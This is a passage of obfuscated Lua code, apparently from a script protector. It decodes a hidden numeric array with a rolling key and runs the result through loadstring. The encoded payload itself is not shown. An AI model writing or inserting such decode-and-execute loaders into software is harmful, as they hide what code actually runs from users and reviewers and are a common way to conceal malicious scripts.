    local function VM_10OlI110(d, k, m)
        local R_l0OI0 = {}
        local c_key = k
        local char = string.char
        local insert = table.insert
        
        -- Virtual Machine Loop
        for idx = 1, #d do
            local val = d[idx]
            -- Decodificacao Rolling Key
            local dec = (val / m) - c_key
            
            -- Anti-Crash Mobile (Garante byte valido)
            dec = dec % 256
            
            insert(R_l0OI0, char(dec))
            
            -- Atualiza a chave para o proximo (Rolling)
            c_key = (c_key + 13) % 150
        end
        return table.concat(R_l0OI0)
    end

    -- Execution Guard
    local F_O00IOI = loadstring(VM_10OlI110(B_O0O00l0I, 10, 5))
    if F_O00IOI then
        F_O00IOI(...)
    end
end)(...)
